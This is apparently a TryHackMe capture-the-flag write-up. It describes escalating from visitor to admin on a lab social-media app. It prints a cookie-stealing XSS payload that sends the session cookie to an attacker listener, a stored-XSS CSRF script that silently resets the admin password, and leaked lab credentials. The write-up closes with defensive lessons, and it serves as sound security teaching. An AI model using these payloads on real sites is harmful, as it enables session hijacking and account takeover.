---
title: "What's Your Name?"
target: "TryHackMe — What's Your Name?"
difficulty: 'medium'
date: 2025-08-27
summary: 'A social-media-style web application split across two virtual hosts, vulnerable to reflected and stored XSS. Cookie stealing via a registration form XSS escalates to moderator access, stored XSS in a chat feature enables CSRF to reset the admin password, and an exposed Selenium script leaks admin credentials as an alternative path.'
role: 'appsec'
tags: ['xss', 'csrf', 'cookie-stealing', 'stored-xss', 'gobuster', 'nmap', 'session-hijacking', 'web-exploitation', 'privilege-escalation']
problem: 'A target machine (worldwap.thm) hosts two web applications — a registration portal on port 80 and a social-media login portal on port 8081 (login.worldwap.thm). A moderator reviews new registrations, and an admin bot monitors the chat. The goal is to escalate from an unauthenticated visitor to admin and retrieve two flags.'
action: 'Enumerated both virtual hosts with Nmap and Gobuster, identified that the PHPSESSID cookie lacked the HttpOnly flag, injected a cookie-stealing XSS payload into the registration email field, caught the moderator session cookie on a netcat listener, hijacked the moderator session, discovered a chat page with an admin bot vulnerable to stored XSS, crafted a CSRF payload to reset the admin password via the change_password endpoint, and also found an exposed admin.py Selenium script with hardcoded admin credentials as an alternative path.'
outcome: 'Retrieved the first flag from the moderator profile page and the second flag (AdM!nP@wnEd) from the admin profile sidebar. Documented both escalation paths — CSRF via stored XSS and the exposed credentials shortcut.'
draft: false
---

## Reconnaissance

### Nmap scan

Starting with a full service scan against the target:

```
nmap -T4 -p- -sC -sV worldwap.thm -Pn -n
```

![Nmap scan results — port 22 running OpenSSH 8.2p1, port 80 running Apache httpd 2.4.41 with http-title "Welcome" and PHPSESSID cookie with httponly flag not set, port 8081 running Apache httpd 2.4.41 with no title. Requested resource on port 80 was /public/html/.](/writeups/thm-whats-your-name/01-nmap-scan.png)

Three ports open: **SSH on 22**, **HTTP on 80**, and **HTTP on 8081**. Both web services are Apache 2.4.41 on Ubuntu. Two things stand out immediately from the Nmap scripts. First, port 80 redirects to `/public/html/` and has an http-title of "Welcome." Second — and more interesting — the `PHPSESSID` cookie on port 80 has `httponly flag not set`. That's a direct invitation for XSS-based cookie theft: if JavaScript can run in a user's browser, it can read `document.cookie` and exfiltrate the session ID.

### Directory enumeration — port 80

Running Gobuster against the main web server:

```
gobuster dir -u 'http://worldwap.thm/' -w /usr/share/wordlists/dirb/big.txt -x .php,.txt,.jsp,.json,.asp,.js -b 403-500
```

![Gobuster results for port 80 — /api (301), /index.php (302), /javascript (301), /logs.txt (200), /phpmyadmin (301), /public (301).](/writeups/thm-whats-your-name/02-gobuster-port80.png)

The `/api` directory and `/public` directory are the interesting results. The `/logs.txt` file returns a 200 — exposed log files on a web server are always worth checking. Digging deeper into `/public`:

```
gobuster dir -u 'http://worldwap.thm/public/' -w /usr/share/wordlists/dirb/big.txt -x .php,.txt,.jsp,.json,.asp,.js -b 403-500
```

![Gobuster results for /public/ — /css (301), /html (301), /images (301), /js (301).](/writeups/thm-whats-your-name/03-gobuster-public.png)

Standard static asset directories under `/public/`. The actual application pages live under `/public/html/` — the login and registration forms.

### Directory enumeration — API

The `/api` directory has its own structure worth mapping:

```
gobuster dir -u 'http://worldwap.thm/api' -w /usr/share/wordlists/dirb/big.txt -x .txt,.php,.asp,.jsp,.json,.js -b 403-500
```

![Gobuster results for /api — /add_post.php, /config.php, /index.php, /login.php, /logout.php, /mod.php, /posts.php, /register.php, /setup.php, all returning 200.](/writeups/thm-whats-your-name/04-gobuster-api.png)

A full set of API endpoints: registration, login, posts, moderation, and setup. The `/api/mod.php` endpoint suggests a moderation workflow — registrations are reviewed before accounts are activated. This will be important later.

### Directory enumeration — port 8081

The second web server on port 8081 is a separate virtual host at `login.worldwap.thm`:

```
gobuster dir -u 'http://worldwap.thm:8081' -w /usr/share/wordlists/dirb/big.txt -x .txt,.php,.asp,.jsp,.json,.js -b 403-500
```

![Gobuster results for port 8081 — /assets (301), /chat.php (302), /change_password.php (302), /clear.php (200), /db.php (200), /index.php (200), /block.php (200), /javascript (301), /login.php (200), /logout.php (302), /logs.txt (200), /phpmyadmin (301), /profile.php (302), /setup.php (200).](/writeups/thm-whats-your-name/05-gobuster-port8081.png)

This is the authenticated side of the application. The `/chat.php`, `/profile.php`, and `/change_password.php` endpoints all return 302 redirects (requiring a session), while `/login.php` is directly accessible. The presence of `/chat.php` is notable — a chat feature with other users means stored content, which means potential stored XSS.

---

## XSS cookie stealing — from visitor to moderator

### The registration flow

Browsing to port 80 shows the **WorldWAP** application. The login page at `worldwap.thm/public/html/login.php` includes a message: *"You need to visit login.worldwap.thm to login once you register successfully."* Attempting to log in with test credentials returns "User not verified":

![Login page at worldwap.thm/public/html/login.php — "User not verified" error dialog after attempting test/test credentials. The page header reads "You need to visit login.worldwap.thm to login once you register successfully."](/writeups/thm-whats-your-name/06-login-user-not-verified.png)

So the flow is: register on port 80, get verified by the moderator, then log in on `login.worldwap.thm` (port 8081). The moderator reviews each registration — meaning they visit a page that displays the registrant's details. If any of those fields are rendered without sanitisation, the moderator's browser will execute whatever is injected.

### The missing HttpOnly flag

The registration page at `worldwap.thm/public/html/register.php` confirms the vulnerability. Opening DevTools and checking the cookie storage shows the `PHPSESSID` cookie with **HttpOnly set to false**:

![Registration page with DevTools open on the Storage tab — PHPSESSID cookie for worldwap.thm showing HttpOnly: false, Secure: false, SameSite: None.](/writeups/thm-whats-your-name/07-register-cookie-no-httponly.png)

Without the HttpOnly flag, JavaScript running in the browser can access `document.cookie` and read the session ID. Combined with the moderator reviewing user-submitted data, this is a textbook reflected-to-stored XSS cookie theft setup.

### Injecting the payload

The registration form has fields for Username, Password, Email, and Name. The Email field accepts arbitrary input — no format validation on the server side. Injecting a cookie-stealing XSS payload into the email field:

```
<script>window.location='http://10.10.75.207:4444/?'+document.cookie;</script>
```

![Registration form filled out — Username "asdasd", Email field containing the XSS payload redirecting to attacker IP on port 4444 with document.cookie appended, Name "lmnza".](/writeups/thm-whats-your-name/08-xss-registration-payload.png)

The payload is simple: when the moderator views this registration, the `<script>` tag executes, redirects their browser to the attacker's listener, and appends their `document.cookie` (containing the PHPSESSID) as a query parameter. Before submitting, I set up a netcat listener on port 4444 to catch the incoming request.

### Catching the cookie

Within moments of submitting the registration, the moderator's browser hits the listener:

```
nc -nvlp 4444
```

![Netcat listener on port 4444 — incoming GET request with PHPSESSID=50geeblnps9ofl8u2kirfs8mmp in the query string. The Referer header shows http://worldwap.thm/ and the User-Agent indicates Chrome 117 on Linux.](/writeups/thm-whats-your-name/09-netcat-cookie-steal.png)

The moderator's session cookie arrives in the clear: `PHPSESSID=50geeblnps9ofl8u2kirfs8mmp`. The Referer header confirms it came from `worldwap.thm` — the moderator was reviewing registrations when the XSS fired. With this cookie, I can impersonate the moderator by swapping my own PHPSESSID for theirs in the browser's cookie storage.

### Moderator access

After replacing my session cookie with the stolen one and browsing to `login.worldwap.thm/profile.php`, I'm logged in as the Moderator:

![Moderator profile page at login.worldwap.thm — Facebook-style UI showing "Welcome, Moderator" with "Flag value" text in the header (value redacted). Left sidebar shows Admin Area with "(You don't have the access!)" note.](/writeups/thm-whats-your-name/10-moderator-profile.png)

The profile page is styled like a social media feed — a Facebook-like layout with sidebar navigation (Friends, Memories, Saved) and a content post. The header displays "Flag value" followed by the first flag. The sidebar also reveals an "Admin Area" link with the note *"(You don't have the access!)"* — moderator privileges aren't enough for the final flag. Time to escalate to admin.

---

## Stored XSS to CSRF — from moderator to admin

### The chat page

As moderator, a new page is accessible: `/chat.php`. It shows a **WAP WORLD** chat interface with three contacts: **Admin Bot** (marked Online), **John Doe**, and **Jane Smith**. The Admin Bot has controls to "Reset/Move Admin Bot to chat.php page" and "Clear all chats":

![Chat page at login.worldwap.thm/chat.php — WAP WORLD header, Admin Bot (Online) selected, with a chat input field containing a test XSS payload. Reset and Clear buttons visible on the right.](/writeups/thm-whats-your-name/11-chat-page-xss.png)

The chat input accepts `<script>` tags — testing with `<script>alert(1)</script>` confirms stored XSS. The Admin Bot is a headless browser that periodically visits the chat page and renders whatever messages are there. Any JavaScript injected into a chat message will execute in the admin bot's browser context.

### The change password endpoint

The **Change Password** page at `/change_password.php` has a telling note: *"This feature is under development and works only if you are logged in as an admin."*

![Change Password page — "This feature is under development and works only if you are logged in as an admin." A single input field for the new password and a "Change Password" button.](/writeups/thm-whats-your-name/12-change-password-page.png)

The endpoint only works for admin sessions, but it doesn't require the current password — just a new one. If the admin bot visits the chat, executes the XSS, and that XSS makes a POST request to `/change_password.php` with a new password, the admin's password gets reset to whatever I choose. That's a CSRF attack via stored XSS.

### Crafting the CSRF payload

The CSRF payload needs to send a POST request to the change password endpoint from within the admin bot's authenticated session. Using `XMLHttpRequest` with the URL Base64-encoded to dodge any basic input filters:

```
<script>
var xhr = new XMLHttpRequest();
xhr.open('POST', atob('aHR0cDovL2xvZ2luLndvcmxkd2FwLnRobS9jaGFuZ2VfcGFzc3dvcmQucGhw'), true);
xhr.setRequestHeader("X-Requested-With", "XMLHttpRequest");
xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
xhr.onreadystatechange = function () {
  if (xhr.readyState === XMLHttpRequest.DONE && xhr.status === 200) {
    alert("Action executed!");
  }
};
xhr.send('action=execute&new_password=admin123');
</script>
```

The `atob()` call decodes to `http://login.worldwap.thm/change_password.php`. When the admin bot renders this chat message, the script fires, POSTs to the change password endpoint with `new_password=admin123`, and the admin's password is silently reset. After sending this message in the chat and waiting for the admin bot to process it, logging in with `admin` / `admin123` on `login.worldwap.thm` grants full admin access.

---

## Alternative path — exposed credentials

There's actually a faster way to get admin access that skips the CSRF chain entirely. Browsing to `login.worldwap.thm/admin.py` reveals a Python Selenium automation script sitting in the web root with hardcoded admin credentials:

![admin.py exposed at login.worldwap.thm — a Python script importing Selenium, with login_url, profile_url, and chat_url defined. Hardcoded credentials: username='admin', password='Un6u3$$4Bl3!!'.](/writeups/thm-whats-your-name/13-admin-py-credentials.png)

The script is the Admin Bot itself — the Selenium automation that logs in as admin and visits the chat page. The credentials are right there in the source: `admin` / `Un6u3$$4Bl3!!`. Logging in with these directly achieves the same result as the CSRF attack, without needing to exploit the chat at all.

---

## The admin flag

Either way — CSRF password reset or the exposed credentials — logging in as admin and visiting the profile page reveals the second flag in the sidebar:

![Admin profile page at login.worldwap.thm — "Welcome, Admin" header with Flag value in the header bar. The left sidebar shows expanded navigation with Groups, Video, Marketplace, Feeds, and at the bottom "Flag value: AdM!nP@wnEd".](/writeups/thm-whats-your-name/14-admin-profile-flag.png)

```
AdM!nP@wnEd
```

The flag sits in the sidebar under the navigation links, styled as a menu item with a trophy icon.

---

## What I took from this

The HttpOnly flag is a single attribute on a cookie — one line of configuration — and its absence made this entire attack chain possible. With HttpOnly set, the XSS in the registration form would still fire, but `document.cookie` would return an empty string and the moderator's session would stay safe. That's the difference between "there's an XSS bug" and "an attacker can hijack any session on the platform." The fix is trivial; the impact of not applying it is not.

The CSRF escalation path is worth thinking about too. The change password endpoint didn't require the current password and had no CSRF token — two separate missing protections, either of which would have blocked the attack. The stored XSS in the chat just made it deliverable: the admin bot rendered untrusted HTML in its own authenticated context, which is exactly why content rendered from user input needs to be sanitised on output, not just on input. The `admin.py` file sitting in the web root is a separate class of mistake entirely — development and automation scripts should never be deployed to production, and credentials should never be hardcoded in source files that might end up accessible.
